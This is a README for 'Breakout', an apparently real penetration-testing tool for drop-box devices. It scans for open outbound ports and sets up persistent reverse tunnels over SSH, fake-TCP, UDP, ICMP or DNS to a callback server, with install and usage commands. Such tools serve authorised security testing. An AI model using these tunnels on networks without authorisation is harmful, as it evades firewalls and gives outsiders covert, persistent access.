# Breakout

![GPLv3 License](https://img.shields.io/badge/License-GPLv3-red.svg) [![Twitter Follow](https://img.shields.io/twitter/follow/robberbear.svg?style=social&label=@robberbear)](https://twitter.com/robberbear)

Breakout automatically gets a device access to the internet on a restricted network by finding open firewall ports and establishing a reverse tunnel via TCP, fake-TCP, UDP, or ICMP.

This tool is designed for drop-box devices placed on a client's network during a penetration test. Once connected, the device can be used for reconnaissance, as a pivot onto other hosts, and more.

## Features

- **Port scanning** — finds open outbound ports via [portquiz.net](http://portquiz.net) and traceroute
- **TCP tunneling** — reverse SSH through discovered open ports
- **Non-TCP tunneling** — fake-TCP, UDP, and ICMP tunnels via [udp2raw-tunnel](https://github.com/wangyu-/udp2raw-tunnel) + [kcptun](https://github.com/iaineng/kcptun)
- **DNS tunneling** — tunnel traffic over DNS queries via iodine
- **WiFi auto-connect** — scans and connects to open wireless networks
- **Auto-tunnel** — persistent reverse SSH with automatic reconnection
- **Reconnaissance** — basic network enumeration (IP, subnet)
- **Raspberry Pi support** — LED status indicators for headless operation

## Requirements

- Python 3.10+
- Root privileges
- Linux (designed for Raspberry Pi / Debian Linux)

### Python Dependencies

```bash
pip install -r requirements.txt
```

| Package | Purpose |
|---|---|
| `netaddr` | IP address validation |
| `netifaces` | Network interface enumeration |
| `pexpect` | SSH tunnel verification |
| `requests` | Port scanning via portquiz.net |
| `scapy` | Raw packet crafting (ICMP, TCP SYN) |
| `wifi` | WiFi network scanning |

### External Tools (for non-TCP tunnels)

- [udp2raw-tunnel](https://github.com/wangyu-/udp2raw-tunnel)
- [kcptun](https://github.com/iaineng/kcptun)
- iodine (for DNS tunneling, `apt install iodine`)

## Installation

### Client (drop-box device)

```bash
git clone https://github.com/robinlennox/breakout.git /opt/breakout
cd /opt/breakout
pip install -r requirements.txt
```

#### Docker (optional)

Run breakout without installing dependencies on the host:

```bash
docker build --network=host -t breakout .
sudo docker run --rm --name breakout-box --cap-add=NET_ADMIN --cap-add=NET_RAW --network=host \
  -v ~/.ssh/id_rsa:/tmp/host_key:ro \
  -v /opt/breakout/configs:/opt/breakout/configs \
  -v /opt/breakout/keys:/opt/breakout/keys \
  -e HOST_SSH_KEY=/tmp/host_key \
  breakout -c <SERVER_IP> -t -v
```

> `--net=host` is required for network interface access, `NET_ADMIN`/`NET_RAW` for raw packet crafting.

### Server (callback server)

The callback server receives reverse tunnels from the drop-box. Run the installer **as root** on a Debian VPS:

```bash
# Option 1: Run directly from GitHub
curl -s https://raw.githubusercontent.com/robinlennox/breakout/master/setup/install_server.sh | sudo bash

# Option 2: Clone and run locally
git clone https://github.com/robinlennox/breakout.git
sudo bash breakout/setup/install_server.sh
```

#### What it does

1. **Installs dependencies** — `git`, `build-essential`, `libz-dev`
2. **Configures SSH** — enables `Port 22` and `ListenAddress 0.0.0.0` in `sshd_config`
3. **Disables ICMP echo** — For use by udp2raw-tunnel
4. **Installs tunnel tools**:
   - [udp2raw](https://github.com/wangyu-/udp2raw-tunnel) — tunnels UDP/ICMP/fakeTCP traffic as raw packets
   - [kcptun](https://github.com/iaineng/kcptun) — accelerates tunnel connections with KCP protocol
5. **Downloads server scripts** to `/opt/breakout/`:
   - `tunnel_server.sh` — maintains udp2raw + kcptun listeners for ICMP (port 4000), fakeTCP (4001), and UDP (4002)
   - `open_ports.sh` — manages firewall rules for incoming SSH connections
   - `breakout_tunnels.sh` — lists and manages active reverse tunnels
6. **Generates SSH keys** — creates `~/.ssh/id_rsa` for key-based authentication
7. **Sets up cron jobs** — runs `tunnel_server.sh` and `open_ports.sh` every minute
8. **Reboots** to apply all changes

#### After installation

```bash
# View active tunnels from client drop-boxes
breakout_tunnels

# The tunnel listeners are managed by cron — check status with:
ps aux | grep -E 'udp2raw|kcptun'
```

> **Note:** The default tunnel password is `passwd` (set in `tunnel_server.sh`). Change this to match the `-p` flag you use on the client.

#### DNS Tunnel Setup (optional)

To use DNS tunneling via iodine (`apt install iodine`), you need two DNS records pointing to your callback server. For example, if your server IP is `1.2.3.4` and your domain is `example.com`:

| Record | Type | Value |
|---|---|---|
| `tunnel.example.com` | A | `1.2.3.4` |
| `t1.example.com` | NS | `tunnel.example.com` |

Then set the `DNS_DOMAIN` environment variable on the server:

```bash
export DNS_DOMAIN=t1.example.com
```

The `tunnel_server.sh` cron job will automatically start `iodined`. On the client:

```bash
sudo python3 breakout.py -c 1.2.3.4 -n t1.example.com -p passwd -v
```

Verify your records with: `dig NS t1.example.com`

See the [Wiki](https://github.com/robinlennox/breakout/wiki/) for detailed [installation guides](https://github.com/robinlennox/breakout/wiki/Installation).

## Usage

```bash
# Basic — scan for open ports and report
sudo python3 breakout.py

# Callback — establish tunnel to your server
sudo python3 breakout.py -c 1.2.3.4

# Full auto — aggressive scan + auto-tunnel + recon
sudo python3 breakout.py -a -c 1.2.3.4 -t -r -v

# Verify tunnel is working (after connection)
curl --proxy socks5h://localhost:8123 https://ipinfo.io
```

### Options

| Flag | Description |
|---|---|
| `-a, --aggressive` | Scan all 65k ports (slow but thorough) |
| `-c, --callback IP` | Callback server IP address |
| `-n, --nameserver` | Nameserver domain for DNS tunnel (iodine) |
| `-p, --password PWD` | Password for tunnel (default: `passwd`) |
| `-r, --recon` | Enable network reconnaissance |
| `-t, --tunnel` | Enable persistent auto-tunneling |
| `-v, --verbose` | Verbose output |

### WiFi Auto-Connect

```bash
sudo python3 connect_wifi.py
```

Automatically scans for and connects to open WiFi networks. Configure SSIDs to ignore in `configs/ignore_ssid`.

## Configuration

Edit `configs/config.ini` to customise behaviour

## Project Structure

```
breakout/
├── breakout.py            # Main entry point
├── connect_wifi.py        # WiFi auto-connect
├── Dockerfile             # Client Docker image
├── requirements.txt       # Python dependencies
├── configs/
│   ├── config.ini         # Configuration
│   └── ignore_ssid        # SSIDs to skip
├── lib/
│   ├── utils.py           # Shared config, logging, helpers
│   ├── layout.py          # Banner and colours
│   ├── network.py         # Network routing & interfaces
│   ├── autotunnel.py      # SSH tunnel generation
│   ├── tunnel.py          # Tunnel orchestration core
│   ├── create_tunnel.py   # Legacy orchestration re-export
│   ├── setup_tunnel.py    # Tunnel connection helpers
│   ├── port_check.py      # Port scanning
│   ├── protocol_check.py  # ICMP/DNS checks
│   ├── ip_check.py        # IP validation
│   ├── check_internet.py  # Connectivity check
│   └── script_management.py # Process management
├── server/
│   ├── breakout_tunnels.sh # List active tunnels
│   ├── open_ports.sh      # Firewall management
│   └── tunnel_server.sh   # Tunnel listeners
├── setup/
│   ├── setup_auto_tunnel.sh # Client-server key exchange for auto-tunneling
│   ├── add_user_remote.sh # Server user setup
│   └── install_server.sh  # Server installation
└── templates/
    ├── check_ssh.bak      # Auto-tunnel template
    └── custom_motd.sh     # Custom MOTD banner script
```

## Credits

- [icmptunnel](https://github.com/jamesbarlow/icmptunnel) by James Barlow
- [kcptun](https://github.com/iaineng/kcptun) by iaineng (fork of xtaci/kcptun)
- [udp2raw-tunnel](https://github.com/wangyu-/udp2raw-tunnel) by wangyu-

## Disclaimer

This tool is only for academic purposes and testing under controlled environments. Do not use without obtaining proper authorisation from the network owner of the network under testing.

The author takes no responsibility for any misuse of this tool.